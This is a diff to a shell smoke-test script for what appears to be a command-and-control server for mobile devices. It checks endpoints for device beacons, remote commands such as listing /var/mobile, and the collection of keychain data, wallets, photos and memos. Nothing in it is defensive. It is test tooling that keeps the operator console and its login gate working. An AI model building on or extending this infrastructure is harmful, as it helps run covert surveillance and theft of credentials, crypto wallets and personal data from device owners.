@@ -48,39 +48,42 @@ echo "== CORS 预检 =="
 probe OPTIONS /api/ip-sync/sync "" 204
 
 echo "== 管理面（授权闭环）=="
-probe GET /admin
+probe GET /admin/
 probe GET /__dash "" 401
-probe GET /__q/devices "" 401
+probe GET /__q/commands "" 401
+probe GET /panel/api/devices "" 401
 probe POST /__auth/login '{"password":"lab888"}'
+# ── 保留契约（Vue 控制台唯一数据源）──
 probe GET /__dash/api
-probe GET /__q/devices
-probe GET /__q/stats
+probe GET "/__dash/api?log_tail=10&acc_tail=5"
 probe GET /__q/commands
-probe GET /__q/wallets
-probe GET /__q/wallets_rules
-probe GET /panel/api/overview
+probe GET /__q/device_command_targets
+probe GET "/__q/device_commands?target=127.0.0.1"
 probe GET /panel/api/devices
+probe GET /panel/api/progress
 probe GET /panel/api/apps
 probe GET /panel/api/war
 probe GET /panel/api/notes
-probe GET /panel/api/commands
-probe GET /panel/api/access
 probe GET /panel/api/visits
-probe GET /panel/api/progress
-probe GET /console
+probe GET /panel/api/keychain/devices
+probe GET /panel/api/results
+probe GET /console "" 302
 probe GET /api/stats
-probe GET "/api/list?type=visitor"
-probe GET "/api/list?type=managed"
-probe GET "/api/activity?limit=5"
-probe GET /api/tasks
-probe GET /api/data/memos
-probe GET /api/data/wallets
 probe GET /api/data/photos
 probe GET /__control
 probe POST /__control '{"type":"ls","params":{"path":"/var/mobile"},"once":true}'
 probe POST /beacon '{"uuid":"S","status":"idle"}'
-probe POST /panel/api/commands '{"type":"memo_scan","params":{},"once":true}'
-probe POST /api/dispatch '{"uuid":"SMOKE-0001","module":"basic_info"}'
+# ── 已下线端点应 404（前端全量迁移 Vue 后收敛）──
+probe GET /panel/api/overview "" 404
+probe GET /panel/api/access "" 404
+probe GET /panel/api/commands "" 404
+probe GET /__q/devices "" 404
+probe GET /__q/stats "" 404
+probe GET /__q/wallets "" 404
+probe GET "/api/list?type=managed" "" 404
+probe GET "/api/activity?limit=5" "" 404
+probe GET /api/data/memos "" 404
+probe POST /api/dispatch '{"uuid":"SMOKE-0001","module":"basic_info"}' 404
 probe POST /__auth/logout '{}'
 probe GET /__dash/api "" 401
 
